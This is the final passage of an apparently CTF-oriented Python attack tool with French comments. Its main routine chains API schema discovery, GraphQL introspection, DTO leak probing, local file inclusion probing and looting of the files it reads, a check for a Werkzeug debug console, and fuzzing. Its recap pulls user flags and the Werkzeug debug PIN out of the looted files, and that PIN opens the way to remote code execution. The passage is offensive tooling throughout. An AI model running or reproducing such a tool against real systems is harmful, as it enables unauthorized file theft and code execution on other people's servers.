            "lfi": [], "lfi_loot": [], "werkzeug": {}}

    # A. schemas + parse
    schemas = find_schemas(base, args)
    data["schemas"] = [p for p, _ in schemas]
    for pth, resp in schemas:
        if is_json(resp):
            eps, title = parse_schema(resp)
            if eps:
                log(f"\n{C.G}{C.BD}  [+] Schema '{pth}' parse : "
                    f"{len(eps)} endpoint(s) documente(s){C.X}"
                    + (f" {C.GR}({title}){C.X}" if title else ""))
                for m, path in sorted(set(eps))[:80]:
                    mc = {"GET": C.G, "POST": C.Y, "PUT": C.CY, "DELETE": C.R}.get(m, C.GR)
                    log(f"      {mc}{m:<7}{C.X} {path}")
                data["endpoints"] = sorted(set(eps))

    # B, C, D
    data["versions"] = [{"path": p, "status": s, "json": j}
                        for p, s, j in find_versions(base, args)]
    data["graphql"] = check_graphql(base, args)
    data["juicy"] = check_juicy(base, args)

    # F. DTO leak (endpoints explicites + endpoints POST/PUT du schema)
    if args.dto or args.endpoint:
        eps = list(args.endpoint)
        for m, path in data["endpoints"]:
            if m in ("POST", "PUT", "PATCH") and path not in eps:
                eps.append(path)
        data["dto"] = run_dto(base, eps, args)

    # G. LFI sur parametres + pivot de version (actif par defaut)
    if not args.no_lfi:
        endpoint_paths = [path for _, path in data["endpoints"]]
        data["lfi"] = probe_lfi(base, args, extra=endpoint_paths)
        if data["lfi"]:
            data["lfi_loot"] = loot_lfi(base, args, data["lfi"])

    # H. Console de debug Werkzeug (RCE)
    if not args.no_lfi:
        data["werkzeug"] = check_werkzeug(base, args)

    # E. fuzz
    if args.fuzz:
        data["fuzz"] = fuzz_routes(base, args)

    # Recap
    log(f"\n{C.B}{C.BD}{'='*66}{C.X}")
    log(f"{C.B}{C.BD}  RECAP  {base}{C.X}")
    log(f"{C.B}{C.BD}{'='*66}{C.X}")
    log(f"  Schemas trouves       : {len(data['schemas'])}")
    log(f"  Endpoints documentes  : {C.G}{len(data['endpoints'])}{C.X}")
    log(f"  Chemins version       : {len(data['versions'])}")
    gql = sum(1 for g in data['graphql'] if g['introspection'])
    log(f"  GraphQL introspection : {(C.R+'OUI'+C.X) if gql else 'non'}")
    log(f"  Endpoints juteux      : {C.Y}{len(data['juicy'])}{C.X}")
    if data["lfi"]:
        l = data["lfi"][0]
        log(f"  LFI                   : {C.R}{C.BD}OUI{C.X} "
            f"({l['endpoint']}?{l['param']}=)")
    if data["werkzeug"].get("present"):
        st = "DEVERROUILLEE" if not data["werkzeug"].get("locked") else "verrouillee"
        log(f"  Console Werkzeug      : {C.R}OUI{C.X} ({st})")
    for lt in data["lfi_loot"]:
        fl = re.search(r"\b[0-9a-f]{32}\b", lt["content"])
        pin = re.search(r"WERKZEUG_DEBUG_PIN\s*=\s*([\d-]+)", lt["content"])
        if lt["file"].endswith("user.txt") and fl:
            log(f"  {C.G}{C.BD}>>> USER FLAG : {fl.group(0)}{C.X}  ({lt['file']})")
        if pin:
            log(f"  {C.R}{C.BD}>>> PIN Werkzeug : {pin.group(1)}{C.X}  ({lt['file']})")
    if data.get("dto"):
        tot_fields = sum(len(d["fields"]) for d in data["dto"])
        log(f"  DTO reconstruits      : {C.G}{len(data['dto'])}{C.X} "
            f"({tot_fields} champ(s) fuite(s))")
    log(f"  Routes fuzz           : {len(data['fuzz'])}")
    log(f"\n{C.GR}Termine en {time.time()-start:.1f}s{C.X}")

    if args.output:
        save_report(base, data, args.output)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log(f"\n{C.R}[!] Interrompu.{C.X}")
